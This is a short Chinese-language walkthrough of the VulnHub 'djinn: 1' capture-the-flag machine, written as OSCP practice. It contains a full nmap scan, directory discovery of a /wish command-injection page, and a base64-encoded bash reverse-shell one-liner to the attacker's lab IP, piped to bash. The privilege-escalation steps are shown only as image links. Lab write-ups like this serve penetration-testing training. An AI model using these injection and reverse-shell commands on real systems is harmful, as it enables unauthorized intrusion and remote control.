[https://www.vulnhub.com/entry/djinn-1,397/](https://www.vulnhub.com/entry/djinn-1,397/)
    
参考资料
 
[https://medium.com/gits/vulnhub-djinn-1-writeup-3d119bcc268c](https://medium.com/gits/vulnhub-djinn-1-writeup-3d119bcc268c)
 
[https://infosecwriteups.com/vulnhub-djinn-1-walkthrough-oscp-prep-by-dollarboysushil-1f01e3c62792](https://infosecwriteups.com/vulnhub-djinn-1-walkthrough-oscp-prep-by-dollarboysushil-1f01e3c62792)
 
探测  
┌──(kali㉿kali)-[~/Desktop/OSCP/djinn]  
└─$ sudo nmap -sS -sV -p- -A -Pn 192.168.163.150  
[sudo] password for kali:  
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org) ) at 2025-07-05 13:05 EDT  
Stats: 0:00:24 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan  
Service scan Timing: About 66.67% done; ETC: 13:06 (0:00:11 remaining)  
Stats: 0:00:50 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan  
Service scan Timing: About 66.67% done; ETC: 13:06 (0:00:24 remaining)  
Nmap scan report for 192.168.163.150  
Host is up (0.00057s latency).  
Not shown: 65531 closed tcp ports (reset)  
PORT STATE SERVICE VERSION  
21/tcp open ftp vsftpd 3.0.3  
| ftp-anon: Anonymous FTP login allowed (FTP code 230)  
| -rw-r--r-- 1 0 0 11 Oct 20 2019 creds.txt  
| -rw-r--r-- 1 0 0 128 Oct 21 2019 game.txt  
|_-rw-r--r-- 1 0 0 113 Oct 21 2019 message.txt  
| ftp-syst:  
| STAT:  
| FTP server status:  
| Connected to ::ffff:192.168.163.128  
| Logged in as ftp  
| TYPE: ASCII  
| No session bandwidth limit  
| Session timeout in seconds is 300  
| Control connection is plain text  
| Data connections will be plain text  
| At session startup, client count was 4  
| vsFTPd 3.0.3 - secure, fast, stable  
|_End of status  
22/tcp filtered ssh  
1337/tcp open waste?  
| fingerprint-strings:  
| NULL:  
| ____ _____ _  
| ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___  
| \x20/ _ \x20 | | | | '_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/  
| ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|  
| Let's see how good you are with simple maths  
| Answer my questions 1000 times and I'll give you your gift.  
| '+', 1)  
| RPCCheck:  
| ____ _____ _  
| ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___  
| \x20/ _ \x20 | | | | '_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/  
| ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|  
| Let's see how good you are with simple maths  
| Answer my questions 1000 times and I'll give you your gift.  
|_ '-', 7)  
7331/tcp open http Werkzeug httpd 0.16.0 (Python 2.7.15+)  
|_http-title: Lost in space  
|_http-server-header: Werkzeug/0.16.0 Python/2.7.15+  
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at [https://nmap.org/cgi-bin/submit.cgi?new-service](https://nmap.org/cgi-bin/submit.cgi?new-service) :  
SF-Port1337-TCP:V=7.95%I=7%D=7/5%Time=68695B66%P=x86_64-pc-linux-gnu%r(NUL  
SF:L,1BC,"\x20\x20____\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20  
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_____\x20_\x20\x20\x20\x20\  
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20/\x20___\|\x20__\x  
SF:20_\x20_\x20__\x20___\x20\x20\x20___\x20\x20\|_\x20\x20\x20_\(_\)_\x20_  
SF:_\x20___\x20\x20\x20___\x20\n\|\x20\|\x20\x20_\x20/\x20_`\x20\|\x20'_\x  
SF:20`\x20_\x20\\\x20/\x20_\x20\\\x20\x20\x20\|\x20\|\x20\|\x20\|\x20'_\x2  
SF:0`\x20_\x20\\\x20/\x20_\x20\\\n\|\x20\|_\|\x20\|\x20\(_\|\x20\|\x20\|\x  
SF:20\|\x20\|\x20\|\x20\|\x20\x20__/\x20\x20\x20\|\x20\|\x20\|\x20\|\x20\|  
SF:\x20\|\x20\|\x20\|\x20\|\x20\x20__/\n\x20\\____\|\\__,_\|_\|\x20\|_\|\x  
SF:20\|_\|\\___\|\x20\x20\x20\|_\|\x20\|_\|_\|\x20\|_\|\x20\|_\|\\___\|\n\  
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20  
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2  
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n  
SF:\nLet's\x20see\x20how\x20good\x20you\x20are\x20with\x20simple\x20maths\  
SF:nAnswer\x20my\x20questions\x201000\x20times\x20and\x20I'll\x20give\x20y  
SF:ou\x20your\x20gift\.\n\(2,\x20'\+',\x201\)\n\>\x20")%r(RPCCheck,1BC,"\x2  
SF:0\x20____\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x  
SF:20\x20\x20\x20\x20\x20\x20\x20\x20_____\x20_\x20\x20\x20\x20\x20\x20\x2  
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20/\x20___\|\x20__\x20_\x20_\x  
SF:20__\x20___\x20\x20\x20___\x20\x20\|_\x20\x20\x20_\(_\)_\x20__\x20___\x  
SF:20\x20\x20___\x20\n\|\x20\|\x20\x20_\x20/\x20_`\x20\|\x20'_\x20`\x20_\x  
SF:20\\\x20/\x20_\x20\\\x20\x20\x20\|\x20\|\x20\|\x20\|\x20'_\x20`\x20_\x2  
SF:0\\\x20/\x20_\x20\\\n\|\x20\|_\|\x20\|\x20\(_\|\x20\|\x20\|\x20\|\x20\|  
SF:\x20\|\x20\|\x20\x20__/\x20\x20\x20\|\x20\|\x20\|\x20\|\x20\|\x20\|\x20  
SF:\|\x20\|\x20\|\x20\x20__/\n\x20\\____\|\\__,_\|_\|\x20\|_\|\x20\|_\|\\_  
SF:__\|\x20\x20\x20\|_\|\x20\|_\|_\|\x20\|_\|\x20\|_\|\\___\|\n\x20\x20\x2  
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x  
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\  
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\nLet's\x2  
SF:0see\x20how\x20good\x20you\x20are\x20with\x20simple\x20maths\nAnswer\x2  
SF:0my\x20questions\x201000\x20times\x20and\x20I'll\x20give\x20you\x20your  
SF:\x20gift\.\n\(5,\x20'-',\x207\)\n\>\x20");  
MAC Address: 00:0C:29:25:5F:78 (VMware)  
Device type: general purpose  
Running: Linux 3.X|4.X  
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4  
OS details: Linux 3.2 - 4.14  
Network Distance: 1 hop  
Service Info: OS: Unix
 
TRACEROUTE  
HOP RTT ADDRESS  
1 0.57 ms 192.168.163.150
 
OS and Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .  
Nmap done: 1 IP address (1 host up) scanned in 94.00 seconds   ┌──(kali㉿kali)-[~/Desktop/OSCP/djinn]  
└─$
 
可以访问  
[http://192.168.163.150:7331/](http://192.168.163.150:7331/)
   

使用dirsearch  
[http://192.168.163.150:7331/genie](http://192.168.163.150:7331/genie)
   

拿到入口  
[http://192.168.163.150:7331/wish](http://192.168.163.150:7331/wish)
   
```
反弹shell换
 
┌──(kali㉿kali)-[~/Desktop/OSCP/djinn]  
└─$ echo "bash -i \>& /dev/tcp/192.168.163.128/443 0\>&1" | base64  
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE2My4xMjgvNDQzIDA+JjEK  
 
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE2My4xMjgvNDQzIDA+JjEK" | base64 -d | bash
```

最后提权

![[djinn 1 image 399f123b17e61e96.png|Exported image]]  
![[djinn 1 image 946ede90e968d9f9.png|Exported image]]  
![[djinn 1 image a7880378be3c8d73.png|Exported image]]  
![[djinn 1 image eb8fcd85f1d805fd.png|Exported image]]  

最后收工

![[djinn 1 image 8070c24e7cf5c040.png|Exported image]]     
![[djinn 1 image 8d699c25afa44a40.png|Exported image]]  
![[djinn 1 image 9fc202526fffe4c6.png|Exported image]]